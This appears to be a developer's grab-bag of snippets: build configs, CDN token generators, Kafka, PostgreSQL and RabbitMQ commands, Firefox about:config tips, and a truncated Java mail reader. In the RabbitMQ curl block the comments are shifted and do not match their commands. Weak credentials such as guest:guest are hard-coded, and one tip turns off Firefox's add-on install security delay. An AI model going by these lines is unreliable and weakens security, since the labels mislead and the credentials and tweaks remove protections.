	<suppress files=".*TraceAutoConfigurationWithDisabledSleuthTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceFilterIntegrationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceFilterWebIntegrationMultipleFiltersTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceFilterWebIntegrationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceMessagingAutoConfiguration.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceMessagingAutoConfigurationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceRequestHttpHeadersFilter.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceWebAutoConfiguration.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceWebClientBeanPostProcessor.*" checks="LineLengthCheck"/>
	<suppress files=".*TracingFeignClient.*" checks="LineLengthCheck"/>
	<suppress files=".*WebClientTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceReactorAutoConfigurationAccessorConfiguration.*" checks="LineLengthCheck"/>
	<suppress files=".*SamplerAutoConfiguration.*" checks="HideUtilityClassConstructorCheck"/>
	<suppress files=".*TraceReactorAutoConfiguration.*" checks="HideUtilityClassConstructorCheck"/>
	<suppress files=".*grpc.stubs.*" checks=".*"/>
</suppressions>
--------------------------------------------------------------------------------------------------------
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-sleuth</artifactId>
            <version>${spring-cloud-sleuth.version}</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
<dependencies>
    <dependency>
        <groupId>org.springframework.cloud</groupId>
        <artifactId>spring-cloud-starter-sleuth</artifactId>
    </dependency>
</dependencies>
--------------------------------------------------------------------------------------------------------
dist: trusty
sudo: required
language: java

addons:
  sonarcloud:
    organization: "cristinanegrean-github"
    token:
      secure: "6r3ebBo7DU9F1pInqogy4crDOWO9pAJHkVBugWTq89gfzaDJT+o/Sut7lwLkPEQqd8dPf/N5mkOKxPaK0cjtyJq55ZFPDeOkWeEnyg6ljlHlcafP4Qt2IjdCgeTcbl+UxIDP1QXQa/g9pnLNn2CynY1AiFqL1VoTDgE6GbIn8byfg7xvJRyyLJHKVSK0Ohs/cwlLy28YjIq09rTp2CP/axZhKoq5UQgkPKiUycULAEzZ2bl/52b4WuKajHelyJ7GzPhlTxTyYpLQPmk2ruuYPg0R0MFZUcFo9G+E2XHzEOftwjiH1zAkhCW0mcCz6BALsZmIo38eK+oQipicO35gHh4p7sd9JQU+0kjltvZSryQYtjXiGzqsC8NRh7LP8eU+HX3OoFeVIUwtyZvAkoZFUjKdjikvLqjVjPF4aC3IO56tgeFcZ1Aaom2g0smJphtA0V62XOW+p+ConIUOjQCfLWB1TxnS3MD9uNJoCIvBqkluMjTseJVbAylRWAN6ZLIuhpPJvSj4HuiL2Zcu/HNn7X/XrQW44VqcvJXTJ43PXN4D/3GH0nQ6WTkOFcfEBOGJmiaHt/rvnn1TKJerqrKvvA9Yp4CUDTZoDpicKk1miB6gSAE6l5E4if7OIPJKCRVELzQJsEhXv6TW46PhLiF6gmeTbNw9G6s6ZczxjZXjF9M="

jdk: oraclejdk8
services:
  - docker

script:
  - ./gradlew clean build docker coveralls sonarqube
--------------------------------------------------------------------------------------------------------
require 'digest/md5'
require 'base64'

secret = 'your_secret'
path = '/path/to/your/file.jpg'

# expiry time in seconds (e.g. 3600 seconds)
expire = Time.now.to_i + 3600
token = Base64.encode64(
    Digest::MD5.digest(
        "#{path}#{secret}#{expire}"
    )
).gsub("\n", "").gsub("+", "-").gsub("/", "_").gsub("=", "")

# final secured URL
url = "http://demo-1.kxcdn.com#{path}?token=#{token}&expire=#{expire}"

puts url
--------------------------------------------------------------------------------------------------------
import base64
from hashlib import md5
from time import time

secret = 'your_secret'
path = "/path/to/file1.jpg"

# expiration in seconds (e.g. 180 seconds)
expire = int(time()) + 180

# generate token
token = base64.encodestring(
    md5(
        "%s%s%s" % (path, secret, expire)
    ).digest()
).replace("\n", "").replace("+", "-").replace("/", "_").replace("=", "")
secured_url = "http://demo-1.kxcdn.com%s?token=%s&expire=%s" % (path, token, expire)

# return secured URL
print secured_url
--------------------------------------------------------------------------------------------------------
<?php
    $secret = 'securetokenkey';
    $path = '/path/to/file1.jpg';

    // Expiration in seconds (e.g. 90 seconds)
    $expire = time() + 90;

    // Generate token
    $md5 = md5($path.$secret.$expire, true);

    $md5 = base64_encode($md5);
    $md5 = strtr($md5, '+/', '-_');
    $md5 = str_replace('=', '', $md5);

    // Use this URL
    $url = "http://yourzone-id.kxcdn.com{$path}?token={$md5}&expire={$expire}";

    echo $url;
?>
--------------------------------------------------------------------------------------------------------
kafka-topics.sh --zookeeper <host,host,host> --topic flume-channel --partitions 1 --replication-factor 2 --create
kafka-console-consumer.sh --bootstrap-server <host,host,host> --topic flume-channel --group flume-channel-consumers --from-beginning
--------------------------------------------------------------------------------------------------------
docker run -p "25:25" -p "143:143" linagora/james-jpa-sample:3.3.0
--------------------------------------------------------------------------------------------------------
DISM /Online /Cleanup-Image /RestoreHealth
Get-AppxPackage -AllUsers| Foreach {Add-AppxPackage -DisableDevelopmentMode -Register “$($_.InstallLocation)\AppXManifest.xml”}
--------------------------------------------------------------------------------------------------------
cmd.exe /k echo WELCOME
--------------------------------------------------------------------------------------------------------git clone https://github.com/armdev/springboot2-swagger.git
cd springboot2-swagger.git
mvn spring-boot:run -P update-sourcepath-for-lombok
firefox localhost:4545/swagger-ui.html
--------------------------------------------------------------------------------------------------------
#!/bin/bash

# ======================================
# ANSI
# ======================================
ansi_reset='\e[0m'

blue='\e[34m'

yellow_b='\e[1;33m'

red_b='\e[1;31m'


# ======================================
# Constants
# ======================================
svg_source="icons.svg"

svg_src_tmp="/tmp/icons.svg"

default_color="#4078c0"

default_size=32

icon_index="index.txt"


# ======================================
# User Input
# ======================================
echo "Enter icon size (skip for default icon dimensions): "
read -r icon_size

echo "Enter 1 or more colors (space or tab separated): "
read -r -a icon_color


# ======================================
# Checks
# ======================================
# If no colors given, add default color to array
[ ${#icon_color[*]} -eq 0 ] && icon_color[0]=$default_color

icon_size=${icon_size:-"$default_size"}


# ======================================
# RENDER
# ======================================
for color in ${icon_color[*]}; do

    mkdir -p "${color}__$icon_size"


    trap 'rm $svg_src_tmp; exit' INT TERM


    cp "$svg_source" "$svg_src_tmp"


    # Change color of temp copy
    [ ! "$color" = "$default_color" ] &&
    sed -i "s/$default_color/$color/" "$svg_src_tmp"


    # Loop through index.txt & render png's
    while read -r i; do

        if [ -f "${color}__$icon_size/$i.png" ]; then
            echo -e "${red_b}${color}__$icon_size/$i.png exists.${ansi_reset}"

        else
            echo
            echo -e "${blue}Rendering ${yellow_b}${color}__$icon_size/$i.png${ansi_reset}"
            inkscape --export-id="${i}" \
                     --export-id-only \
                     --export-width="$icon_size" --export-height="$icon_size" \
                     --export-png="${color}__$icon_size/$i.png" "$svg_src_tmp" >/dev/null
        fi
    done < "$icon_index"


    # Remove copy before next iteration or EXIT
    rm "$svg_src_tmp"

done


# If notify-send installed, send notif
hash notify-send 2>/dev/null &&
notify-send -i 'terminal' \
            -a 'Terminal' \
            'Terminal'    \
            'Finished rendering icons!'
--------------------------------------------------------------------------------------------------------
sudo apt install oracle-java11-set-default
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### Database
--------------------------------------------------------------------------------------------------------
"c:\xampp\mysql\bin\mysqld.exe" --defaults-file="c:\xampp\mysql\bin\my.ini" --standalone --console
--------------------------------------------------------------------------------------------------------
CREATE ROLE ivs NOINHERIT NOREPLICATION LOGIN PASSWORD 'user_ivs';
--------------------------------------------------------------------------------------------------------
UPDATE SET date_from=now() AT TIME ZONE 'GMT'
date_from timestamp without time zone
SELECT date_from AT TIME ZONE 'GMT'
--------------------------------------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS templates (
  id UUID PRIMARY KEY,
  name VARCHAR(255) NOT NULL,
  content BYTEA NOT NULL
);

CREATE TABLE IF NOT EXISTS images (
  id UUID PRIMARY KEY,
  template_id UUID,
  name VARCHAR(255),
  content BYTEA NOT NULL,
  foreign key (template_id) references templates on delete cascade
);

create or replace function bytea_import(p_path text, p_result out bytea)
                   language plpgsql as $$
declare
  l_oid oid;
begin
  select lo_import(p_path) into l_oid;
  select lo_get(l_oid) INTO p_result;
  perform lo_unlink(l_oid);
end;$$;
--------------------------------------------------------------------------------------------------------
create database activiti
CHARACTER SET utf8
COLLATE utf8_bin;

create database activitiadmin
CHARACTER SET utf8
COLLATE utf8_bin;
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### Maven & Gradle
--------------------------------------------------------------------------------------------------------
mvn clean install -DskipTest
cd core
mvn liquibase:update
--------------------------------------------------------------------------------------------------------
mvn clean test -pl streamflyer-core jacoco:report coveralls:report -Pcoverage
mvn clean dependency:copy-dependencies package
mvn site
mvn license:format
--------------------------------------------------------------------------------------------------------
mvn enforcer:display-info
mvn enforcer:enforce
--------------------------------------------------------------------------------------------------------
$ mvn archetype:generate -DgroupId=com.example
 -DartifactId=demo
 -DarchetypeArtifactId=maven-archetype-webapp
 -DinteractiveMode=false
--------------------------------------------------------------------------------------------------------
mvn verify cargo:run
docker-compose up mongodb
mvn spring-boot:run
--------------------------------------------------------------------------------------------------------
gradlew clean build publishToMavenLocal -i -x test
--------------------------------------------------------------------------------------------------------
gradle dependencies
mvn dependency:tree
--------------------------------------------------------------------------------------------------------
mvn license:update-file-header
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### RabbitMQ
--------------------------------------------------------------------------------------------------------
# sbin/rabbitmqctl stop
rabbitmqctl list_permissions --vhost gw1
rabbitmqctl list_permissions --vhost /
# sbin/rabbitmq-server -detached

http://localhost:15672/
# sbin/rabbitmq-plugins enable rabbitmq_management
sbin/rabbitmqctl status
sbin/rabbitmqctl stop
chkconfig --list | grep -i qpid
chkconfig qpidd off
chkconfig --list | grep -i qpid

cd /usr/save
wget http://www.rabbitmq.com/releases/rabbitmq-server/v3.0.4/rabbitmq-server-generic-unix-3.0.4.tar.gz
tar xvfz rabbitmq-server-generic-unix-3.0.4.tar.gz
cd rabbitmq_server-3.0.4

# cd /usr/save/rabbitmq_server-3.0.4
# sbin/rabbitmq-server -detached
--------------------------------------------------------------------------------------------------------
rabbitmqctl add_user userivs ivs
rabbitmqctl set_user_tags userivs administrator
rabbitmqctl set_permissions -p / userivs ".*" ".*" ".*"
rabbitmq-plugins enable rabbitmq_management

## Get a list of vhosts:
curl -i -u userivs:ivs http://localhost:15672/api/whoami
## Get a list of channels, fast publishers first, restricting the info items we get back:
curl -i -u guest:guest http://localhost:15672/api/vhosts
## Create a new vhost:
curl -i -u guest:guest "http://localhost:15672/api/channels?sort=message_stats.publish_details.rate&sort_reverse=true&columns=name,message_stats.publish_details.rate,message_stats.deliver_get_details.rate"
# Create a new exchange in the default virtual host:
curl -i -u guest:guest -H "content-type:application/json" -XPUT http://localhost:15672/api/vhosts/foo
## Delete exchange again:
curl -i -u guest:guest -H "content-type:application/json" -XDELETE http://localhost:15672/api/exchanges/%2F/my-new-exchange

sbin/rabbitmqctl stop
sbin/rabbitmq-server -detached
# sbin/rabbitmqctl status
--------------------------------------------------------------------------------------------------------
%comspec% /k "C:\Program Files\RabbitMQ Server\rabbitmq_server-3.7.14\sbin\rabbitmq-service.bat" start & if not errorlevel 1 exit /b 0
%comspec% /k "C:\Program Files\RabbitMQ Server\rabbitmq_server-3.7.14\sbin\rabbitmq-service.bat" stop & if not errorlevel 1 exit /b 0
%comspec% /k "C:\Program Files\RabbitMQ Server\rabbitmq_server-3.7.14\sbin\rabbitmq-service.bat" remove & if not errorlevel 1 exit /b 0
%comspec% /k "C:\Program Files\RabbitMQ Server\rabbitmq_server-3.7.14\sbin\rabbitmq-service.bat" install & if not errorlevel 1 exit /b 0
--------------------------------------------------------------------------------------------------------
mvn clean package -Pprod
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### DEVELOPMENT
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(
  classes = AppConfig.class,
  loader = AnnotationConfigContextLoader.class)
public class SpringRetryTest {
    @Autowired
    private MyService myService;

    @Autowired
    private RetryTemplate retryTemplate;

    @Test(expected = RuntimeException.class)
    public void givenTemplateRetryService_whenCallWithException_thenRetry() {
        retryTemplate.execute(arg0 -> {
            myService.templateRetryService();
            return null;
        });
    }
}
    @Autowired
    private RetryTemplate retryTemplate;

    retryTemplate.execute(arg0 -> {
            myService.templateRetryService();
            return null;
        });               

   retryTemplate.execute(new RetryCallback<Void, RuntimeException>() {
    @Override
    public Void doWithRetry(RetryContext arg0) {
        myService.templateRetryService();
    }
});
--------------------------------------------------------------------------------------------------------
1. Change Number of Content Processes

Do you like to work with a lot of tabs open at any one time, or do you rarely have more than, say, 5 tabs open? The more content processes you have, the more CPU resources will be assigned to each tab (which will also use more RAM).

If you have a powerful PC, then you can set this at a reasonably high number, which should improve the stability and performance of each open tab in Firefox. The name of this setting in about:config is dom.ipc.processCount

Default value: 4

Modified value: 7-12 (depending on number of tabs you usually have open)
2. Disable Unnecessary Animations

Animations in Firefox Quantum are not a bad thing, but if you have an old PC where every MB of RAM counts or simply don’t need these animated flourishes, you can disable them by going to toolkit.cosmeticAnimations.enabled and setting the value to “false.”

Default value: true
Modified value: false
3. Change Minimum Tab Width

It will take a more sharp-eyed Firefox user to notice this adjustment Mozilla made for Firefox Quantum. The default tab width is now just 76 pixels, whereas before it was 100. To adjust this, go to browser.tabs.tabMinWidth.

Default value: 76
Modified value: 100 if you want the same tab width as in older versions of Firefox, but really you can make this whatever you like. Just don’t go overboard!
4. Reduce Session History Cache, Save RAM

If you’re using an older machine, then even the typically speedy Firefox may slow down your PC with the default settings. This could be in part because of how it stores Web pages in its short-term memory (or RAM), which you can access using the Back and Forward buttons.

firefox-about-config-sessionhistory

The preference browser.sessionhistory.max_total_viewers affects how many pages Firefox stores in such a way that they load super fast.

Default value: – 1 (adaptable)
Modified value: any number, reflecting the number of pages you want to store. (We recommend less than 4 if your PC is struggling for speed, while those with 4GB plus can go for 8 or more.)

The preference browser.sessionhistory.max_entries affects how many pages each tab stores in its Back/Forward history altogether.

Default value: 50
Modified value:If your PC is struggling, lower this to 25, check if it helps, then adjust accordingly.
5. Disable Extension Compatibility Checks

Compatibility checks. Who needs ’em, right? Actually they’re pretty handy as a general reference of which extensions will work with your version of Firefox and which won’t, but Firefox doesn’t always get it right. If you want to see whether an extension that Firefox claims is incompatible may actually work, do the following:

    Right-click anywhere on the about:config page, then click “New -> Boolean”
    Type extensions.checkCompatibility into the box, click OK, then select “false” and click OK again.
    This preference will now exist in your list, and you can disable it at any time by right-clicking it and clicking “Reset.”

about-config-disable-compatibility-check
6. Change Firefox Download Location

By default, Firefox downloads go to the Windows “Downloads” folder, but you can change this by tweaking browser.download.folderList

Default value: 1
Modified values:

    0 – Saves all downloads to the desktop
    2 – Saves to the same location as the previous download

7. Get Asked Where You Want Each Download Saved

If you want to have more direct control over your downloads and decide what directory you want each one to be saved in, change the preference browser.download.useDownloadDir to “false.”

Default value: true
Modified value: false – prompts you where to save each download

about-config-firefox-tricks-download-locations
8. Open New Tab for Search Box Results

By default, the things you search for in the Firefox search box open in the current tab. To open in a new tab instead, you’ll need to modify browser.search.openintab

Default value: false – opens search results in current tab
Modified value: true – opens search results in new tab
9. New Tabs Page

Firefox’s New Tabs page organizes all the sites you’ve bookmarked and are most likely to visit in a convenient grid. Best of all, you can tweak how big this grid is, so while it uses 3×3 thumbnails by default, you can change it thanks to the browser.newtabpage.rows and browser.newtabpage.columns preferences.

Default value: 3 in “rows,” 5 in “columns”
Modified values: Whatever number you like!

about-config-firefox-tricks-change-columns
10. Adjust the Smart Location Bar’s Number of Suggestions

In Firefox when you start typing in the location (or URL) bar, a dropdown list of suggested sites will be shown. If you want it to show more (or less) than ten suggestions, you can adjust the browser.urlbar.maxRichResults keys and get it to show the number you want.

Default value: 10
Modified value: Set to your desired number of suggestions. If you want to disable it altogether, set it to -1.
11. Adjust the Session Restore Saving Frequency

Firefox saves your session every fifteen seconds by default, but you can change the value of browser.sessionstore.interval so that Firefox will save the session at a longer interval.

Default: 15000 (in msecs, equivalent to fifteen seconds)
Modified value: Set it to your desired value. 1000 means one sec, and 60000 means one minute
12. Extend Scripts’ Execution Time

In Firefox a script is only given ten seconds to respond, after which it will issue an unresponsive script warning. If you are stuck on a slow network connection, you might want to increase the script execution time via dom.max_script_run_time to cut down on the frequency of the no-script warning.

Default value: 10 (in secs)
Modified value: 20, or any value greater than 10
13. Handling JavaScript Popups

When you come across a site that executes a javascript, open a new window function, and if the popup window is without all the usual window features, e.g. back/forward/reload buttons, status bar, etc., Firefox will automatically treat it as a popup and will not open it as a new tab. However, if you find this to be a nuisance and want to open all new windows in new tabs, you can specify it via the browser.link.open_newwindow.restriction setting.

Default value: 2 – Open all JavaScript windows the same way you have Firefox handle new windows unless the JavaScript call specifies how to display the window

Modified values:

    0 – open all links the way you have Firefox handle new windows
    1 – do not open any new windows
    2 – open all links the way you have Firefox handle new windows unless Javascript specifies how to display the window

14. Enable Spell-Checking in All Text Fields

The default spell-checking function only checks for multi-line text boxes. You can change the option in layout.spellcheckDefault to get it to spell-check for single line text boxes as well.

Default value: 1 (spellcheck for multi-line text boxes only)
Modified values:

    0 – disable spellcheck
    2 – enable spell-check for all text boxes

about-config-firefox-tricks-spellcheck
15. Lower Memory Usage When Minimized

This tweak is mainly for Windows users. When you minimize Firefox, it will send Firefox to your virtual memory and free up your physical memory for other programs to use. Firefox will reduce its physical memory usage, when minimized, to approximately 10MB (give or take some), and when you maximize Firefox it will take back the memory that it needs.

The preference name does not exist and needs to be created.

Right-click on the background and select “New -> Boolean.”

Enter the name when prompted: config.trim_on_minimize

Enter the value: True
16. Increase/Decrease the Amount of Disk Cache

When a page is loaded, Firefox will cache it into the hard disk so that it doesn’t need to be downloaded again the next time it is loaded. The bigger the storage size you cater for Firefox, the more pages it can cache.

Before you increase the disk cache size, make sure that browser.cache.disk.enable is set to “True.”

Config name: browser.cache.disk.capacity
Default value: 50000 (in KB)
Modified value:

    0 – disable disk caching
    Any value lower than 50000 reduces the disk cache
    Any value higher than 50000 increases the disk cache

17. Select All Text When You Click on the URL Bar

In Windows and Mac Firefox highlights all text when you click on the URL bar. In Linux it does not select all the text. Instead, it places the cursor at the insertion point. Regardless of which platform you are using, you can tweak browser.urlbar.clickSelectsAll to either select all or place the cursor at the insertion point.

Modified value:

    False – place cursor at the insertion point
    True – select all text when you click

18. Same Zoom Level for Every Site

Firefox remembers your zoom preference for each site and sets it to your preferences whenever you load the page. If you want the zoom level to be consistent from site to site, you can toggle the value of browser.zoom.siteSpecific from “True” to “False.”

Default value: True
Modified value: False (enable same zoom preferences for every site)
19. Setting Your Zoom Limit

If you find that the max/min zoom level is still not sufficient for your viewing, you can change the zoom limit to suit your viewing habits.

Config name: zoom.maxPercent
Default value: 300 (percent)
Modified value: any value higher than 300

Config name: zoom.minPercent
Default value: 30 (percent)
Modified value: any value
20. Configure Your Backspace Button

In Firefox you can set your backspace by getting it to either go back to the previous page or scroll up a page if it’s a scrolling site. Holding Shift as a modifier will go forward a page if the value is set to 0 and scroll down if the value is set to 1.

Config name: browser.backspace_action
Default value: 0 – goes back a page
Modified value: 1 – scrolls up a page

about-config-firefox-tricks-backspace-config
21. Increase Offline Cache

If you do not have access to the Internet most of the time, you might want to increase the offline cache so that you can continue to work offline. By default, Firefox caches 500MB of data from supported offline web apps. You can change that value to any amount you like.

Config name: browser.cache.offline.capacity
Default value: 512000 (in KB)
Modified value: any value higher than 512000 will increase the cache value
22. Disable Delay Time When Installing Add-ons

Every time you install a Firefox add-on, you will have to wait for several seconds before the actual installation starts. To cut down on this waiting time, you can turn the preference security.dialog_enable_delay off so that the installation will begin immediately.

Default value: 1000 (in msec)
Modified value:

    0 – starts installation immediately
    any other value (in msec)

about-config-firefox-tricks-security-dialog-delay
23. View Source in Your Favorite Editor

This is very useful for developers who are always using the “view source” function. This tweak allows you to view the source code of a given website in an external editor.

There are two configurations that need to be made:

Config name: view_source.editor.external
Default value: False
Modified value: True (enable view source using external text editor)

Config name: view_source.editor.path
Default value: blank
Modified value: insert the file path to your editor here
24. Increasing “Save Link As” Timeout Value

When you right-click and select “Save Link As … ” the browser will request the content disposition header from the URL to determine the filename. If the URL does not deliver the header within one second, Firefox will issue a timeout value. This could happen very frequently in a slow network connection environment. To prevent this issue from happening frequently, you can increase the timeout value to reduce the possibility of a timeout by editing Browser.download.saveLinkAsFilenameTimeout

Default value: 4000 (4 seconds)
Modified value: any value higher than 1000 (value is in msec)
25. Autohide Toolbar in Fullscreen Mode

In fullscreen mode the toolbar is set to autohide and appear only when you hover over it with your mouse. If you want, you can choose to have it visible all the time instead by toggling the value of browser.fullscreen.autohide to “False” to always show the toolbar.

Default value: True (always autohide)
Modified value: False (always show the toolbar)
26. Increase Add-on Search Result

If you go to “Tools -> Add-ons -> Get Add-ons” and perform a search, Firefox will display fifteen matching results. If you want more or less results here, you can adjust extensions.getAddons.maxResults
--------------------------------------------------------------------------------------------------------
  @Pattern(regexp = "^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$")
  private String ipAddress;
--------------------------------------------------------------------------------------------------------
package net.codejava.mail;
 
import java.util.Properties;
 
import javax.mail.Address;
import javax.mail.Folder;
import javax.mail.Message;
import javax.mail.Message.RecipientType;
import javax.mail.MessagingException;
import javax.mail.NoSuchProviderException;
import javax.mail.Session;
import javax.mail.Store;
 
/**
 * This program demonstrates how to get e-mail messages from a POP3/IMAP server
 *
 * @author www.codejava.net
 *
 */
public class EmailReceiver {
 
    /**
     * Returns a Properties object which is configured for a POP3/IMAP server
     *
     * @param protocol either "imap" or "pop3"
     * @param host
     * @param port
     * @return a Properties object
     */
    private Properties getServerProperties(String protocol, String host,
            String port) {
        Properties properties = new Properties();
 
        // server setting
        properties.put(String.format("mail.%s.host", protocol), host);
        properties.put(String.format("mail.%s.port", protocol), port);
 
        // SSL setting
        properties.setProperty(
                String.format("mail.%s.socketFactory.class", protocol),
                "javax.net.ssl.SSLSocketFactory");
        properties.setProperty(
                String.format("mail.%s.socketFactory.fallback", protocol),
                "false");
        properties.setProperty(
                String.format("mail.%s.socketFactory.port", protocol),
                String.valueOf(port));
 
        return properties;
    }
 
    /**
     * Downloads new messages and fetches details for each message.
     * @param protocol
     * @param host
     * @param port
     * @param userName
     * @param password
     */
    public void downloadEmails(String protocol, String host, String port,
            String userName, String password) {
        Properties properties = getServerProperties(protocol, host, port);
        Session session = Session.getDefaultInstance(properties);
 
        try {
            // connects to the message store
            Store store = session.getStore(protocol);
            store.connect(userName, password);
 
            // opens the inbox folder
            Folder folderInbox = store.getFolder("INBOX");
            folderInbox.open(Folder.READ_ONLY);
 
            // fetches new messages from server
            Message[] messages = folderInbox.getMessages();
 
            for (int i = 0; i < messages.length; i++) {
                Message msg = messages[i];
                Address[] fromAddress = msg.getFrom();
